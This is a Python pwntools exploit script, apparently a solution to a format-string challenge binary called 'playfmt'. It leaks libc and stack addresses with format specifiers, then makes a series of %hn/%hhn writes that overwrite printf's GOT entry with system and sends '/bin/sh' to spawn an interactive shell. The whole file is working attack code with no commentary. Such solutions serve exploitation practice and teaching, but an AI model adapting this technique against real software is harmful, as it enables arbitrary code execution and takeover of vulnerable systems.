#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc 
printf_got = elf.got['printf']

# libc leak
p.recvuntil("Server\n")
p.sendafter("=\n", '%15$x %6$x A')
leak = int(p.recv(8), 16) # libc_start_main+247
libcbase = leak - libc.symbols['__libc_start_main'] - 247
log.info("leak : "+hex(leak))
log.info("libcbase : "+hex(libcbase))
p.recvuntil(" ")
leak2 = int(p.recv(8), 16)
log.info("leak2 : "+hex(leak2))
stack = leak2 - 0x24
log.info("stack : "+hex(stack))

#gdb.attach(p)

pay = '%{}x'.format((stack+0x28) & 0xFFFF)
pay += '%6$hn'
pay += 'A'
p.sendafter("A", pay)

pay = '%{}x'.format((stack+0xc) & 0xFFFF)
pay += '%21$hn'
pay += 'A'
p.sendafter("A", pay)

pay = '%{}x'.format(printf_got & 0xFFFF)
pay += '%57$hn'
pay += 'A'
p.sendafter("A", pay)

pay = '%{}x'.format((printf_got+2) & 0xFFFF)
pay += '%10$hn'
pay += 'A'
p.sendafter("A", pay)

system = libcbase + libc.symbols['system']
system_low = system & 0xFFFF
system_high = (system >> 16) & 0xFF
pay = '%{}x'.format(system_high)
pay += '%11$hhn'
pay += '%{}x'.format(system_low - system_high)
pay += '%4$hn'
pay += 'A'
p.sendafter("A", pay)

p.sendline('/bin/sh')

p.interactive()
